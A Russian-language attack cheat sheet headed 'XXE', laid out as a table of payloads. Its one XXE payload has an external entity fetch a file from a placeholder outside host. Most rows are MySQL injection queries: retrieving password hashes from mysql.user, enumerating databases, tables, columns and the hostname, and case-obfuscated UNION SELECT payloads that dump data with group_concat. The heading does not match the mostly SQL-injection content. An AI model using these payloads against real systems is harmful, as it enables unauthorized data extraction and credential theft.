## XXE
|Команда|Код|
|----------------|-------------------------------|
|Обычный xxe   | <?xml version="1.0" ?><br><!DOCTYPE r [<br><!ELEMENT r ANY ><br><!ENTITY sp SYSTEM<br>"http://x.x.x.x:443/test.txt"> ]><br><r>&sp;</r>|   
|Получение версии | SELECT VERSION();<br>SELECT @@VERSION;<br>SELECT @@GLOBAL.VERSION;|   
|Получение информации о пользователе | SELECT user()<br>SELECT current_user()<br>SELECT system_user()<br>SELECT session_user()<br>SELECT user,password FROM mysql.user;|   
|Получение хэшей паролей |SELECT host, user, password FROM mysql.user;|   
|Получение текущей базы данных | SELECT database()<br>SELECT db_name();<br>SELECT database();<br>SELECT schema_name FROM<br>information_schema.schemata;|   
|Вывод списка баз данных  |SELECT schema_name FROM information_schema.schemata;<br>SELECT distinct(db) FROM mysql.db |   
|Вывод списка колонок  |SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’<br>SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename'; |   
|Вывод таблиц  | SELECT table_name FROM information_schema.tables;<br>SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’|
|Поиск имени таблицы по колонкам, содержащимся в ней | SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = ‘username’;|
|Получение имени хоста |SELECT @@hostname; |
|Union based  |UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name, 0x7c)+fRoM+information_schema.schemata<br>UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name, 0x7C)+fRoM+information_schema.tables+ wHeRe+table_schema=…<br>UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name, 0x7C)+fRoM+information_schema.columns+ wHeRe+table_name=…<br>UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM +.. |
| | |


<br>
